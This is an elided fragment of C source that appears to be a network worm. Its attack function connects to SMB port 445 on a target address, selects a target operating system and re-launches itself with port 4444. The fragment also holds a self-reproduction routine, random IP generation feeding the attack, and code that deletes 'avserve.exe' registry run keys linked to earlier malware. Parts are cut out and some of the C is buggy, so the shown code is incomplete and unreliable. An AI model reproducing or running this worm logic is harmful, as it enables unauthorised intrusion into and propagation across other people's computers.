...
int attack(int target, int port2, int opt, char *ip1)
{
  ...
  sprintf((char *)hostipc, "\\\\%s\\ipc$", ip1);
  ...
  port = htons(port2) ^ (USHORT)0x9999;
  ...
  printf("[*] Target: IP: %s: OS: %s\n", ip1, ttarget[target].name);
  printf("[*] Connecting to %s:445 ... ", ip1);
  sleep(100);
  ...
  if (opt == 1)
  {
    ...
    char OS;
    sprintf(&OS, "%c", recvbuf[48 + 10 * 2]);
    if ((strcmp(&OS, "1")) == 0)
    {
      attack(0, 4444, 0, ip1);
      return 0;
    }
    else if ((strcmp(&OS, "0")) == 0)
    {
      attack(1, 4444, 0, ip1);
      return 0;
    }
...
void reproduction(char *ip1, int sock)
{
  ...
  memcpy(&iplocal, host->h_addr, host->h_length);
...
int tirageip()
{
  ...
  int ipartie1 = rand() % 255;
  printf("%d\n", ipartie1);
  srand(time(NULL));
  int ipartie2 = rand() % 255;
  printf("%d\n", ipartie2);
  srand(time(NULL) / GetTickCount());
  int ipartie3 = rand() % 255;
  printf("%d\n", ipartie3);
  srand(GetTickCount() ^ time(NULL));
  int ipartie4 = rand() % 255;
  printf("%d\n", ipartie4);

  sprintf(&ip, "192.168.20.103");
  printf("%s\n", ip);
  attack(0, 4444, 1, ip);
}
...
{
  HKEY la_clef;
  RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &la_clef);
  RegDeleteValue(la_clef, "avserve.exe");
  RegDeleteValue(la_clef, "avserve2.exe");
  RegCloseKey(la_clef);
}
int main()
{
